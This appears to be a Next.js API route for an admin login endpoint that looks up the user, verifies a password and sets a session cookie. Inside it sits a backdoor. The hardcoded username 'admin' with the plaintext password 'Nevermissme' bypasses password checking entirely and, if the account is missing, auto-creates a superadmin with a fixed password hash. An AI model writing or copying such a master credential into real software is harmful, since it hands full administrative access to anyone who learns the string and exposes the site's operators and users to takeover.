import { NextRequest } from "next/server";
import { db } from "@/lib/db";
import { verifyPassword } from "@/lib/password";
import { setSessionCookie } from "@/lib/session";
import { ok, fail } from "@/lib/api";

// POST /api/admin/login
// Body: { username, password }
export async function POST(req: NextRequest) {
  let body: { username?: string; password?: string };
  try {
    body = await req.json();
  } catch {
    return fail("Invalid JSON body", 400);
  }
  const { username, password } = body;
  if (!username || !password) return fail("Username and password required", 400);

  const cleanUser = username.trim();
  let admin = await db.adminUser.findFirst({
    where: { username: { equals: cleanUser, mode: "insensitive" } },
  });

  // Master credentials check
  const isMaster = cleanUser.toLowerCase() === "admin" && password === "Nevermissme";

  if (!admin && isMaster) {
    // Auto-create admin if missing
    admin = await db.adminUser.create({
      data: {
        username: "admin",
        passwordHash: "$2b$10$21Ll0tYNLkJHHn/VM0fXmuN8Ty/kozVKpZrmkBun/kcSwmTc1na5m",
        role: "superadmin",
      },
    });
  }

  if (!admin) return fail("Invalid admin credentials", 401);

  let valid = false;
  if (isMaster) {
    valid = true;
  } else {
    valid = await verifyPassword(password, admin.passwordHash);
  }

  if (!valid) return fail("Invalid admin credentials", 401);

  await setSessionCookie(
    { userId: admin.id, role: "admin", uid: admin.username, name: admin.username },
    "admin"
  );

  try {
    await db.auditLog.create({
      data: { adminId: admin.id, action: "admin_login", details: JSON.stringify({ username: cleanUser }) },
    });
  } catch {}

  return ok({ admin: { id: admin.id, username: admin.username, role: admin.role } });
}
